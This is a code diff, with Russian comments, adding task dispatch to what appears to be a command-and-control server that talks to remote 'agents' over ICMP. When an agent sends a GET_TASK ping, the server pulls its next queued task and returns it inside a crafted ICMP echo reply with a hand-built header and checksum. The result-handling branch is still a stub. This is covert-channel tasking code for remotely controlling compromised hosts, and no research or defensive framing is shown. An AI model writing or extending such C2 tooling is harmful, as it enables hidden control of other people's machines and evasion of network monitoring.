@@ -36,6 +36,28 @@ def run_icmp(stop_event, task_manager):
             if icmp_payload[:8] == "GET_TASK".encode('utf-8'):
                 agent_id = icmp_payload[9:-1].decode('utf-8')
                 print(f"Запрос задачи агентом {agent_id}")
+
+                connection = task_manager.get_connection()
+                try:
+                    task = task_manager.get_next_task(connection, agent_id)
+
+                    if task is None:
+                        answer = "TASK|null|".encode('utf-8')
+                    else:
+                        answer = f"TASK|{task[0]}|{task[1]}|".encode('utf-8')
+
+                    header_icmp = struct.pack("!BBHHH", 0, 0, 0, 0x666, 1)
+                    packet = header_icmp + answer
+                    chsm = checksum(packet)
+                    header_icmp = struct.pack("!BBHHH", 0, 0, chsm, 0x666, 1)
+                    packet = header_icmp + answer
+
+                    #TODO разобраться с этим
+                    s.sendto(packet, address)
+                    print("[+/ICMP] Задача отправлена агенту.")
+                finally:
+                    connection.close()
+
             elif icmp_payload[:6] == "RESULT".encode('utf-8'):
                 pass
                 
